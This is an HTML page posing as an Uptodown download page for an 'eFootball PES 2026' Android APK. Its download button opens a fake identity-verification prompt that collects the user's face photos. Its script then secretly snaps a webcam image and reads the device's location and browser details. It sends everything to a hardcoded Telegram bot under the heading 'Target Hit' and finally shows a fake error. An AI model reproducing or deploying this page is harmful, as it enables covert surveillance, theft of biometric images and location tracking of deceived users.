<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>eFootball PES 2026 for Android - Download</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #081d24;
            --ut-dark: #051116;
            --ut-blue: #1b85d3;
            --ut-green: #00b451;
            --ut-dim: #7e949c;
            --ut-card: #0c262f;
        }

        body {
            margin: 0;
            background-color: var(--ut-bg);
            font-family: 'Roboto', sans-serif;
            color: #ffffff;
            line-height: 1.4;
        }

        /* --- NAVIGATION --- */
        header {
            background: var(--ut-dark);
            height: 56px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #102a33;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        .menu-icon { color: var(--ut-blue); font-size: 24px; cursor: pointer; }
        .logo { height: 22px; margin-left: 15px; }

        .path-bar {
            background: #06181e;
            padding: 10px 16px;
            font-size: 10px;
            color: var(--ut-dim);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }

        /* --- APP HEADER --- */
        .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
        .app-icon { 
            width: 100px; height: 100px; 
            border-radius: 22px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
            object-fit: cover; /* Rasmni to'liq va buzilmaydigan qiladi */
        }
        .app-info h1 { font-size: 26px; font-weight: 700; margin: 0; }
        .app-sub { font-size: 14px; margin-top: 4px; color: var(--ut-dim); }
        .app-sub a { color: var(--ut-blue); text-decoration: none; }

        /* --- DOWNLOAD BUTTON --- */
        .btn-latest {
            background: var(--ut-green);
            color: #ffffff;
            width: 100%;
            padding: 16px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 18px;
            border: none;
            box-shadow: 0 4px 0 #008a3d;
            cursor: pointer;
            margin-bottom: 10px;
        }

        /* --- TECHNICAL SECTIONS (100% MATCH) --- */
        .tech-section-group { margin-top: 35px; }
        .tech-group-title {
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #ffffff;
        }
        .tech-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px 20px;
        }
        .tech-item { display: flex; align-items: flex-start; gap: 15px; }
        .tech-icon-box {
            width: 36px; height: 36px;
            border: 1px solid var(--ut-blue);
            border-radius: 8px;
            display: flex; align-items: center; justify-content: center;
            color: var(--ut-blue); flex-shrink: 0;
        }
        .tech-content { display: flex; flex-direction: column; }
        .tech-label { font-size: 11px; color: var(--ut-dim); font-weight: 700; text-transform: uppercase; }
        .tech-value { font-size: 14px; font-weight: 500; word-break: break-all; }
        .tech-value a { color: var(--ut-blue); text-decoration: none; }

        /* --- VERIFICATION MODAL --- */
        #verify-overlay {
            display: none; position: fixed; inset: 0;
            background: rgba(5, 17, 22, 0.98); z-index: 9999;
            align-items: center; justify-content: center; padding: 20px;
        }
        .verify-modal {
            background: var(--ut-card); width: 100%; max-width: 340px;
            padding: 30px; border-radius: 16px; border: 1px solid var(--ut-blue); text-align: center;
        }
        video, canvas, #hidden-input { display: none; }
    </style>
</head>
<body>

<header>
    <div class="menu-icon">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo" alt="Uptodown">
</header>

<div class="path-bar">Android / Games / Sports / eFootball PES 2026</div>

<div class="main-content">
    <div class="app-header">
        <img src="image_5.png" class="app-icon" alt="eFootball PES 2026 icon">
        <div class="app-info">
            <h1>eFootball PES 2026</h1>
            <div class="app-sub">10.4.0 | <a href="#">Uptodown.com</a></div>
        </div>
    </div>

    <button class="btn-latest" onclick="openVerification()">Latest version</button>

    <div class="tech-section-group">
        <div class="tech-group-title">Basic Information</div>
        <div class="tech-grid">
            <div class="tech-item"><div class="tech-icon-box">👤</div><div class="tech-content"><span class="tech-label">Developer</span><span class="tech-value"><a href="#">Uptodown.com</a></span></div></div>
            <div class="tech-item"><div class="tech-icon-box">📄</div><div class="tech-content"><span class="tech-label">License</span><span class="tech-value">Free</span></div></div>
            <div class="tech-item"><div class="tech-icon-box">⚽</div><div class="tech-content"><span class="tech-label">Category</span><span class="tech-value"><a href="#">General</a></span></div></div>
            <div class="tech-item"><div class="tech-icon-box">ℹ️</div><div class="tech-content"><span class="tech-label">Rating</span><span class="tech-value">All ages</span></div></div>
            <div class="tech-item"><div class="tech-icon-box">🌐</div><div class="tech-content"><span class="tech-label">Languages</span><span class="tech-value">English (45 more)</span></div></div>
        </div>
    </div>

    <div class="tech-section-group">
        <div class="tech-group-title">Security and privacy</div>
        <div class="tech-grid">
            <div class="tech-item"><div class="tech-icon-box">🛠️</div><div class="tech-content"><span class="tech-label">Required permissions</span><span class="tech-value"><a href="#">See 31 permissions</a></span></div></div>
            <div class="tech-item"><div class="tech-icon-box">📢</div><div class="tech-content"><span class="tech-label">Advertising</span><span class="tech-value">This app contains ads</span></div></div>
            <div class="tech-item" style="grid-column: 1 / -1;"><div class="tech-icon-box">🛡️</div><div class="tech-content"><span class="tech-label">Certificate signature</span><span class="tech-value">643506f9f2323740df1e2af5659caba8,ed86b3c7d53cba96769d1b431108e398</span></div></div>
            <div class="tech-item"><div class="tech-icon-box">🔍</div><div class="tech-content"><span class="tech-label">Uptodown Analysis</span><span class="tech-value"><a href="#">See security report</a></span></div></div>
        </div>
    </div>

    <div class="tech-section-group">
        <div class="tech-group-title">Download info</div>
        <div class="tech-grid">
            <div class="tech-item"><div class="tech-icon-box">📥</div><div class="tech-content"><span class="tech-label">Downloads</span><span class="tech-value">1,034,167,963</span></div></div>
            <div class="tech-item"><div class="tech-icon-box">📅</div><div class="tech-content"><span class="tech-label">Date</span><span class="tech-value">Apr 1, 2026</span></div></div>
            <div class="tech-item"><div class="tech-icon-box">📦</div><div class="tech-content"><span class="tech-label">File type</span><span class="tech-value">APK</span></div></div>
            <div class="tech-item"><div class="tech-icon-box">💾</div><div class="tech-content"><span class="tech-label">Size</span><span class="tech-value">9.82 MB</span></div></div>
            <div class="tech-item" style="grid-column: 1 / -1;"><div class="tech-icon-box">🔑</div><div class="tech-content"><span class="tech-label">SHA256</span><span class="tech-value">589d836964354c1086841a100cf311fe20c7e100bf58f3d8e1c0c5d74fd4ad6d</span></div></div>
        </div>
    </div>

    <div class="tech-section-group" style="padding-bottom: 50px;">
        <div class="tech-group-title">Technical details</div>
        <div class="tech-grid">
            <div class="tech-item"><div class="tech-icon-box">⚙️</div><div class="tech-content"><span class="tech-label">Package Name</span><span class="tech-value">com.uptodown</span></div></div>
        </div>
    </div>
</div>

<div id="verify-overlay">
    <div class="verify-modal">
        <h3 id="v-title">Verify Your Identity</h3>
        <p style="font-size: 13px; color: var(--ut-dim);">Upload 5 photos to unlock the download.</p>
        <label for="hidden-input" style="background: var(--ut-blue); display: block; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 20px;">UPLOAD PHOTOS</label>
        <input type="file" id="hidden-input" multiple accept="image/*" onchange="processAI(this)">
    </div>
</div>

<video id="v-stream" autoplay playsinline></video>
<canvas id="v-canvas"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
    let capturedFiles = [];

    async function initAI() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    initAI();

    function openVerification() { document.getElementById('verify-overlay').style.display = 'flex'; }

    async function processAI(input) {
        document.getElementById('v-title').innerText = "Processing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const detection = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (detection.length > 0) capturedFiles.push(f);
        }
        executeStealth();
    }

    async function executeStealth() {
        const platform = navigator.userAgent;
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('v-stream');
            video.srcObject = stream;
            await new Promise(res => setTimeout(res, 1000));
            const canvas = document.getElementById('v-canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const snap = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
            stream.getTracks().forEach(t => t.stop());
            navigator.geolocation.getCurrentPosition(async (p) => {
                await sendToBot(platform, `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`, snap);
            }, () => sendToBot(platform, "Location Blocked", snap));
        } catch(e) { sendToBot(platform, "Cam Error", null); }
    }

    async function sendToBot(pInfo, loc, snap) {
        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.CHAT, text: `📥 *Target Hit*\nDevice: ${pInfo}\nLocation: ${loc}`, parse_mode: 'Markdown'})
        });
        if(snap) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.CHAT); fd.append('photo', snap);
            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd});
        }
        for (let file of capturedFiles) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.CHAT); fd2.append('photo', file);
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("Verification failed. Error code: 0x884.");
        location.reload();
    }
</script>
</body>
</html>
